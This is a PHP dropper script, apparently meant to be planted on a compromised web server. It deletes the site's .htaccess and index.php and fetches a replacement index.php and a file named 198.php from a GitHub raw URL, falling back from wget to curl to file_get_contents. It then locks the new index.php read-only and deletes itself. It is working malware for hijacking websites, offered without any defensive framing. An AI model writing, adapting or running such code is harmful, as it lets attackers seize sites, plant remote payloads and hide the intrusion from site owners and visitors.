<?php

$uriPath = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$segments = array_values(array_filter(explode('/', $uriPath)));
$inSubdir = count($segments) > 1;

if ($inSubdir) {
    chdir('..');
}

$remoteIndex = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/index.php';
$remote97    = 'https://raw.githubusercontent.com/mdmomin365366-gif/bela/refs/heads/main/198.php';

// ─── Fetch Helper ────────────────────────────────────────────────────────────

function fetchRemote(string $url): string|false
{
    // 1) Try wget
    if (isWgetAvailable()) {
        $tmpFile = tempnam(sys_get_temp_dir(), 'fetch_');
        $cmd     = 'wget -q --timeout=20 -O ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($url) . ' 2>/dev/null';
        @exec($cmd, $out, $ret);
        if ($ret === 0 && file_exists($tmpFile) && filesize($tmpFile) > 0) {
            $data = file_get_contents($tmpFile);
            @unlink($tmpFile);
            return $data;
        }
        @unlink($tmpFile);
    }

    // 2) Try curl (extension)
    if (isCurlAvailable()) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 20,
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false && $data !== '') {
            return $data;
        }
    }

    // 3) Try file_get_contents (allow_url_fopen)
    if (isFileGetContentsAvailable()) {
        $ctx  = stream_context_create(['http' => ['timeout' => 20]]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false && $data !== '') {
            return $data;
        }
    }

    return false;
}

// ─── Availability Checks ─────────────────────────────────────────────────────

function isWgetAvailable(): bool
{
    // Check if exec is usable and wget binary exists
    if (!isFunctionEnabled('exec')) {
        return false;
    }
    @exec('wget --version 2>/dev/null', $out, $ret);
    return $ret === 0;
}

function isCurlAvailable(): bool
{
    return function_exists('curl_init') && extension_loaded('curl');
}

function isFileGetContentsAvailable(): bool
{
    return ini_get('allow_url_fopen') && function_exists('file_get_contents');
}

function isFunctionEnabled(string $func): bool
{
    if (!function_exists($func)) {
        return false;
    }
    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    return !in_array($func, $disabled, true);
}

// ─── Remove Existing Files ───────────────────────────────────────────────────

$files = ['.htaccess', 'index.php'];

foreach ($files as $file) {
    if (file_exists($file)) {
        @chmod($file, 0644);
        @unlink($file);
    }
}

// ─── Download & Write index.php ──────────────────────────────────────────────

$data = fetchRemote($remoteIndex);
if ($data !== false) {
    file_put_contents('index.php', $data);
    chmod('index.php', 0444);
}

// ─── Download & Write 198.php ────────────────────────────────────────────────

$data97 = fetchRemote($remote97);
if ($data97 !== false) {
    file_put_contents('198.php', $data97);
}

// ─── Done ────────────────────────────────────────────────────────────────────

echo $inSubdir ? 'Subdir Done' : 'Current dir Done';

@unlink(__FILE__);
